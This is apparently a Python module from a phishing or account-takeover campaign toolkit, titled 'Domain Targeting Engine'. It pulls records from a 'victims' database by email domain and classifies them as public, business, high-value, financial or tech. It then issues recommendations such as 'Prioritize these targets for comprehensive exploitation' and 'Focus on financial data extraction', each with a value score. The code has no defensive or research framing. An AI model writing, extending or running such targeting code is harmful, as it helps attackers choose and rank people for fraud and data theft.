"""
Domain Targeting Engine
Targeting victims based on email domains and company information
"""

import os
import json
from datetime import datetime, timezone
from typing import Dict, List, Any, Optional
import logging
import re
from dataclasses import dataclass

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class DomainTarget:
    """Domain targeting criteria"""
    domains: List[str]
    exclude_domains: List[str]
    domain_patterns: List[str]
    company_sizes: List[str]
    industries: List[str]
    exclude_industries: List[str]
    public_domains_only: bool
    business_domains_only: bool

class DomainTargetingEngine:
    """Domain-based targeting engine for campaigns"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        
        # Domain classifications
        self.public_domains = [
            "gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com",
            "icloud.com", "protonmail.com", "tutanota.com", "yandex.com"
        ]
        
        self.business_domains_patterns = [
            r".*\.com$", r".*\.org$", r".*\.net$", r".*\.co\.uk$", r".*\.com\.vn$"
        ]
        
        self.high_value_domains = [
            "apple.com", "microsoft.com", "google.com", "amazon.com", "facebook.com",
            "netflix.com", "spotify.com", "uber.com", "airbnb.com", "tesla.com"
        ]
        
        self.financial_domains = [
            "bank", "finance", "investment", "credit", "loan", "insurance",
            "paypal", "stripe", "square", "venmo", "zalopay", "momo"
        ]
        
        self.tech_domains = [
            "tech", "software", "ai", "cloud", "data", "cyber", "security",
            "startup", "innovation", "digital", "mobile", "web"
        ]
    
    def initialize_targeting(self, targeting_config: Any) -> bool:
        """Initialize domain targeting"""
        try:
            self.target_config = targeting_config
            logger.info("Domain targeting initialized")
            return True
            
        except Exception as e:
            logger.error(f"Error initializing domain targeting: {e}")
            return False
    
    def get_target_victims(self, limit: int = 1000) -> List[Dict[str, Any]]:
        """Get victims matching domain criteria"""
        try:
            if not self.mongodb:
                return []
            
            collection = self.mongodb.victims
            query = {}
            
            # Build domain query
            if self.target_config.domains:
                query["email"] = {"$regex": f"@({'|'.join(self.target_config.domains)})$", "$options": "i"}
            
            if self.target_config.domain_patterns:
                pattern_query = []
                for pattern in self.target_config.domain_patterns:
                    pattern_query.append({"email": {"$regex": f"@{pattern}$", "$options": "i"}})
                if pattern_query:
                    query["$or"] = pattern_query
            
            # Exclude domains
            if self.target_config.exclude_domains:
                exclude_pattern = f"@({'|'.join(self.target_config.exclude_domains)})$"
                query["email"] = {"$not": {"$regex": exclude_pattern, "$options": "i"}}
            
            # Filter by domain type
            if self.target_config.public_domains_only:
                public_pattern = f"@({'|'.join(self.public_domains)})$"
                query["email"] = {"$regex": public_pattern, "$options": "i"}
            
            if self.target_config.business_domains_only:
                # Exclude public domains
                exclude_public = f"@({'|'.join(self.public_domains)})$"
                query["email"] = {"$not": {"$regex": exclude_public, "$options": "i"}}
            
            # Execute query
            cursor = collection.find(query).limit(limit)
            victims = list(cursor)
            
            logger.info(f"Found {len(victims)} victims matching domain criteria")
            return victims
            
        except Exception as e:
            logger.error(f"Error getting domain targets: {e}")
            return []
    
    def analyze_domain_distribution(self, victims: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze domain distribution of victims"""
        try:
            distribution = {
                "by_domain": {},
                "by_domain_type": {
                    "public": 0,
                    "business": 0,
                    "high_value": 0,
                    "financial": 0,
                    "tech": 0,
                    "other": 0
                },
                "total_victims": len(victims)
            }
            
            for victim in victims:
                email = victim.get("email", "")
                domain = self._extract_domain(email)
                
                if domain:
                    # Count by domain
                    distribution["by_domain"][domain] = distribution["by_domain"].get(domain, 0) + 1
                    
                    # Classify domain type
                    domain_type = self._classify_domain(domain)
                    distribution["by_domain_type"][domain_type] += 1
            
            return distribution
            
        except Exception as e:
            logger.error(f"Error analyzing domain distribution: {e}")
            return {}
    
    def _extract_domain(self, email: str) -> Optional[str]:
        """Extract domain from email address"""
        try:
            if "@" in email:
                return email.split("@")[1].lower()
            return None
        except:
            return None
    
    def _classify_domain(self, domain: str) -> str:
        """Classify domain type"""
        domain_lower = domain.lower()
        
        if domain_lower in self.public_domains:
            return "public"
        elif domain_lower in self.high_value_domains:
            return "high_value"
        elif any(financial in domain_lower for financial in self.financial_domains):
            return "financial"
        elif any(tech in domain_lower for tech in self.tech_domains):
            return "tech"
        elif self._is_business_domain(domain_lower):
            return "business"
        else:
            return "other"
    
    def _is_business_domain(self, domain: str) -> bool:
        """Check if domain is likely a business domain"""
        # Check against public domains
        if domain in self.public_domains:
            return False
        
        # Check against patterns
        for pattern in self.business_domains_patterns:
            if re.match(pattern, domain):
                return True
        
        return False
    
    def get_domain_intelligence(self, domain: str) -> Dict[str, Any]:
        """Get intelligence about a domain"""
        try:
            intelligence = {
                "domain": domain,
                "type": self._classify_domain(domain),
                "is_public": domain.lower() in self.public_domains,
                "is_business": self._is_business_domain(domain.lower()),
                "is_high_value": domain.lower() in self.high_value_domains,
                "industry_hints": [],
                "risk_level": "medium"
            }
            
            # Analyze domain for industry hints
            domain_lower = domain.lower()
            
            if any(financial in domain_lower for financial in self.financial_domains):
                intelligence["industry_hints"].append("financial")
                intelligence["risk_level"] = "high"
            
            if any(tech in domain_lower for tech in self.tech_domains):
                intelligence["industry_hints"].append("technology")
                intelligence["risk_level"] = "high"
            
            if domain_lower in self.high_value_domains:
                intelligence["risk_level"] = "critical"
            
            return intelligence
            
        except Exception as e:
            logger.error(f"Error getting domain intelligence: {e}")
            return {}
    
    def get_targeting_recommendations(self, victims: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Get targeting recommendations based on victim analysis"""
        try:
            recommendations = []
            
            # Analyze domain distribution
            distribution = self.analyze_domain_distribution(victims)
            
            # High-value domain recommendation
            high_value_count = distribution["by_domain_type"]["high_value"]
            if high_value_count > 0:
                recommendations.append({
                    "type": "high_value_targets",
                    "priority": "high",
                    "description": f"Found {high_value_count} high-value domain targets",
                    "action": "Prioritize these targets for comprehensive exploitation",
                    "potential_value": high_value_count * 100
                })
            
            # Financial domain recommendation
            financial_count = distribution["by_domain_type"]["financial"]
            if financial_count > 0:
                recommendations.append({
                    "type": "financial_targets",
                    "priority": "high",
                    "description": f"Found {financial_count} financial domain targets",
                    "action": "Focus on financial data extraction",
                    "potential_value": financial_count * 80
                })
            
            # Business domain recommendation
            business_count = distribution["by_domain_type"]["business"]
            if business_count > 0:
                recommendations.append({
                    "type": "business_targets",
                    "priority": "medium",
                    "description": f"Found {business_count} business domain targets",
                    "action": "Target for business intelligence gathering",
                    "potential_value": business_count * 60
                })
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error getting targeting recommendations: {e}")
            return []
